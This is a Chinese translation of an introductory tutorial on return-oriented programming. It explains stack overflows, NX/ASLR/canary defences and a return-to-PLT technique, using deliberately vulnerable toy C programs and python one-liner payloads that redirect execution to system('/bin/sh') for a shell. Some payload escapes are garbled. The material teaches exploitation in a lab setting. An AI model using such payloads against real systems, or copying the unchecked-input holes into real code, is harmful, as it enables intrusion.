
# 【技术分享】ROP技术入门教程


                                阅读量   
                                **441552**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](./img/85619/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：ketansingh.net
                                <br>原文地址：[https://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/](https://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/)

译文仅供参考，具体内容表达以及含义原文为准

****

[![](./img/85619/t010813e73d31292402.jpg)](./img/85619/t010813e73d31292402.jpg)

翻译：[beswing](http://bobao.360.cn/member/contribute?uid=820455891)

预估稿费：200RMB

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿

**<br>**

**前言**

不可否认的是，不管是CTF赛事，还是二进制漏洞利用的过程中，ROP都是一个很基础很重要的攻击技术。

这一段是译者自己加的，与原文无关。 

ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。 另外译者推荐，如果想更好的学习ROP技术，可以参考蒸米大神的一步一步学ROP系列文章，请自行查找。

ROP是一种攻击技术，其中攻击者使用堆栈的控制来在现有程序代码中的子程序中的返回指令之前，立即间接地执行精心挑选的指令或机器指令组。

因为所有执行的指令来自原始程序内的可执行存储器区域，所以这避免了直接代码注入的麻烦，并绕过了用来阻止来自用户控制的存储器的指令的执行的大多数安全措施。

因此，ROP技术是可以用来绕过现有的程序内部内存的保护机制的。在学习下面的内容之前，先确保自己已经了解了基本的堆栈溢出的漏洞原理。

**<br>**

**一个简单的经典缓冲区溢出例子**



```
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
void vuln(){
   char buffer[10];
   read(0,buffer,100);
   puts(buffer);
}
int main() {
   vuln();
}
```

这个程序有明显的缓冲区溢出攻击。在vuln()函数中设置了10个字节的缓冲区，而我们读取的字节高达100个字节。read()的滥用导致了缓冲区溢出。

我们可以看看vuln函数调用时候，堆栈的情况：



```
ADDRESS       DATA
0xbfff0000    XX XX XX XX  &lt;- buffer 
0xbfff0004    XX XX XX XX 
0xbfff0008    XX XX XX XX 
0xbfff000c    XX XX XX XX 
........
0xbfff0020    YY YY YY YY  &lt;- saved EBP address
0xbfff0024    ZZ ZZ ZZ ZZ  &lt;- return address
```

当缓冲区填充正确的大小时，可以修改保存的返回地址，允许攻击者控制EIP，从而允许他执行任意任意代码。

**<br>**

**缓冲区溢出防御措施**

但是，在现代的系统中，有一些防御措施可以避免被攻击:

ALSR

Stack Canaries

NX/DEP

防御措施大概有这些内容，原文作者只是简单的介绍了一下，如果想更清晰了解，可以参考译者[博客](http://bestwing.me/2016/12/26/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/)。

**NX/DEP**

DEP表示数据执行预防，此技术将内存区域标记为不可执行。通常堆栈和堆被标记为不可执行，从而防止攻击者执行驻留在这些区域的内存中的代码。

**ASLR**

ASLR表示地址空间层随机化。这种技术使共享库，堆栈和堆被占用的内存的地址随机化。这防止攻击者预测在哪里采取EIP，因为攻击者不知道他的恶意有效载荷的地址。

**Stack Canaries**

下文简称为:Canary

在这种技术中，编译器在堆栈帧的局部变量之后和保存的返回地址之前放置一个随机化保护值。在函数返回之前检查此保护，如果它不相同，然后程序退出。我们可以将它可视化为:



```
ADDRESS       DATA
0xbfff0000    XX XX XX XX  &lt;- buffer 
0xbfff0004    XX XX XX XX 
0xbfff0008    XX XX XX XX 
0xbfff000c    CC CC CC CC  &lt;- stack canary
........
0xbfff0020    YY YY YY YY  &lt;- saved EBP address
0xbfff0024    ZZ ZZ ZZ ZZ  &lt;- return address
```

如果攻击者试图修改返回地址，Canayr也将不可避免地被修改。因此，在函数返回之前，检查这个Canayr，从而防止利用。

那么我们如何绕过这些防御措施呢？

<br>

**Return Oritented Programming (ROP编程)**

ROP是一个复杂的技术，允许我们绕过DEP和ALSR，但不幸的是（或对于用户来说幸运的是）这不能绕过Canary，但如果有额外的内存泄漏，我们可以通过泄露，leak canary的值和使用它。

ROP re-uses ，即我们可以重用Bin文件或者Libc文件(共享库)中的代码。这些代码，或者说指令，通常被我们称作“ROP Gadget”。

下文，我们将来分析一下，一个特殊的ROP例子，我们称作Return2PLT。应该注意的是，只有libc基地址被随机化，特定函数从其基地址的偏移总是保持不变。如果我们可以绕过共享库基地址随机化，即使ASLR打开，也可以成功利用漏洞程序。

让我们分析下，下面这个脆弱的代码



```
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
void grant() {
   system("/bin/sh");
}
void exploitable() {
   char buffer[16];
   scanf("%s", buffer);
   if(strcmp(buffer,"pwned") == 0) grant();
   else  puts("Nice tryn");
}
int main(){
   exploitable();
   return 0;
}
```

我们上文说了，ROP技术并不能绕过Canay保护措施，所以我们编译这个程序的时候需要关闭堆栈保护程序。我们可以利用下面的命令编译。

```
$ gcc hack_me_2.c -o hack_me_2 -fno-stack-protector -m32
```



**译者的程序分析**

我先看看代码，再翻译作者的文章。我们看到，在exploitable()函数中，设置了16字节的缓冲区，但是值得我们注意的是scanf函数没有安全的使用，这导致我们可以写入超过16字节，这就导致了缓冲区溢出的可能。我们用注意到，有个函数调用了sytem("/bin/sh")，这里我们就可以假设，如果我们可以操作函数调转，去调用grant()函数，我们就可以拿到shell了。 基本上思路就是这样的。

读取程序的内存映射，我们可以看到它的栈是只读/ 不可执行的。

[![](./img/85619/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01484b0d7fb01db666.png)

<br>

**让我们尝试控制EIP**

由于scanf不执行绑定的check，因此我们可以通过覆盖函数的返回地址来指向某个已知位置来控制EIP。我会尝试指向它grant()达到getshell的目的。我们可以通过objdum工具，来获取grant()的地址。

除了利用objdump来看，当然我们还是可以用IDA查找的。

objdump命令如下

```
$ objdump -d ./hack_me_2 | grep grant
```

结果应该看起来是这样的



```
080484cb &lt;grant&gt;：
 8048516：e8 b0 ff ff ff call 80484cb &lt;grant&gt;
```

接下来就是写exp，达到目的了。

```
$（python -c'print“A”* 28 +“ xcb  x84  x04  x08”' ; cat  - ）| ./hack_me_2
```

<br>

**这里译者补充几点**

第一: 为什么是28个字节？这个是需要我们自己去分析的，我们需要计算两者直接字节数的值，才好控制跳转，毕竟本文是基于我们了解缓冲区溢出知识后的，如果有疑问，可以留言，或者自寻百度。

第二: 从代码来看，我们可以知道原文作者的环境是基于32位的，所以这里需要了解一下小端的知识。

运行上述代码之后，我们就可以成功getshell了。

很明显，大多数程序不会为你调用shell这个很容易，我们需要修改程序让demo更贴近现实一点。



```
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
char *shell = "/bin/sh";
void grant() {
   system("cowsay try again");
}
void exploitable() {
   char buffer[16];
   scanf("%s", buffer);
   if(strcmp(buffer,"pwned") == 0) grant();
   else  puts("Nice tryn");
}
int main(){
   exploitable();
   return 0;
}
```

运行先前的exp，我们发现并没有getshell，那么我们怎么去调用sysytem(“/bin/sh”)呢？

分析，这次的程序并没有直接调用 system("/bin/sh")了，但是漏洞产生的原理和之前的一样。就不再复述了。

<br>

**调用函数约定**

当反汇编我们的代码看起来像这样的:



```
080484cb &lt;grant&gt;：
 80484cb：55 push％ebp
 80484cc：89 e5 mov％esp，％ebp
 80484ce：83 ec 08 sub $ 0x8，％esp
 80484d1：83 ec 0c sub $ 0xc，％esp
 80484d4：68 e8 85 04 08 push $ 0x80485e8
80484d9：e8 b2 fe ff ff call 8048390 &lt; system @ plt&gt;
 80484de：83 c4 10 add $ 0x10，％esp
 80484e1：90 nop
 80484e2：c9 leave
 80484e3：c3 ret
080484e4 &lt;exploitable&gt;：
 8048516：e8 b0 ff ff ff call 80484cb &lt;grant&gt;
 804851b：eb 10 jmp 804852d &lt;exploitable + 0x49&gt;
```

让我们简单看看每个指令的作用。

在可利用的情况下，我们调用grant（）使用指令去做两件事情，推送下一个地址0x0804851b到堆栈，并更改EIP为0x080484cb 到grant()所在的地址



```
push   %ebp    
mov %esp,%ebp
```

这是函数的初始化。它为当前函数设置堆栈框架。它通过push之前保存的一堆栈帧的基指针，然后将当前基指针更改为堆栈指针（$ ebp = $ esp）。现在grant（）可以使用它的栈来存储变量和whatnot。

之后，它通过从esp中减去来为局部变量分配空间（因为堆栈增长），最后0x080485e8在调用之前将地址压入堆栈，system()它是指向将作为参数传递的字符串的指针system()，它有点像

```
system(*0x80485e8)
```

最后ret，将保存的 函数返回地址从堆栈的顶部pop出值到EIP。

<br>

**构建我们自己的堆栈帧**

我们已经看到了当函数被调用时堆栈的行为，这意味着

我们可以构造我们自己的堆栈帧

控制参数到我们跳转到的函数

确定此函数返回的位置

如果我们控制这两者之间的堆栈，我们可以控制返回函数的参数

通过ROP链接在多个函数中跳转

从objdump我们看到“/ bin / sh”的地址是 0x080485E0



```
$ objdump -s -j .rodata hack_me_3
hack_me_3:     file format elf32-i386
Contents of section .rodata:
80485d8 03000000 01000200 2f62696e 2f736800  ......../bin/sh.
80485e8 636f7773 61792074 72792061 6761696e  cowsay try again
80485f8 00257300 70776e65 64004e69 63652074  .%s.pwned.Nice t
8048608 72790a00
```

我们构造一个“假”的堆栈结构，然后修改函数的返回地址，这样的堆栈结构如下:



```
ADDRESS       DATA
........
 // exploitable() stack
0xbfff0004    80 48 4d 90  &lt;- return address
// our frame
0xbfff0008    41 41 41 41  &lt;- saved return pointer, system()
0xbfff000c    08 04 85 E0  &lt;- "/bin/sh"
```

所以以，当函数exploitable()返回时，它返回system()，将看到它返回地址为41414141和参数为“/bin/sh”，这将产生一个shell，但是当它返回时会弹出41414141到EIP，它是一个有效的地址，我们可以ROP连接他们，只要他们不需要参数。所以，我们最后的利用代码是:

```
$（python -c'print“A”* 28 +“ x90  x83  x04  x08”+“ x41  x41  x41  x41”+“ xE0  x85  x04  x08” | ./hack_me_3
```

[![](./img/85619/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016cd9c7e9a55fcd2c.png)

<br>

**参考文献**

[https://sploitfun.wordpress.com/](https://sploitfun.wordpress.com/) 

[https://blog.zynamics.com/2010/03/12/a-gentle-introduction-to-return-oriented-programming/](https://blog.zynamics.com/2010/03/12/a-gentle-introduction-to-return-oriented-programming/) 

[https://crypto.stanford.edu/~blynn/rop/](https://crypto.stanford.edu/~blynn/rop/) 
